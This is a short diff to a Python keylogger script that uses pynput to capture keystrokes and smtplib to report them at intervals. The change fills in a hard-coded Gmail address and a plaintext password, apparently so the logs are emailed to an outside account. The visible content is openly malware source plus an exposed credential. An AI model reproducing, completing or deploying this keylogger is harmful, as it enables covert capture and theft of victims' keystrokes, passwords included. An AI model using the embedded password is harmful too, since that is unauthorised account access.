@@ -5,6 +5,7 @@ import pynput.keyboard
 import threading
 import smtplib
 
+
 class Logger:
     def __init__(self, time_interval, email, password):
         self.log = ""
@@ -46,5 +47,5 @@ class Logger:
             self.report()
             keyboard_listener.join()
 
-keylogger = Logger(60, "kkosmos381@gmail.com", "")
+keylogger = Logger(60, "kkosmos381@gmail.com", "Root123kosmos")
 keylogger.start()
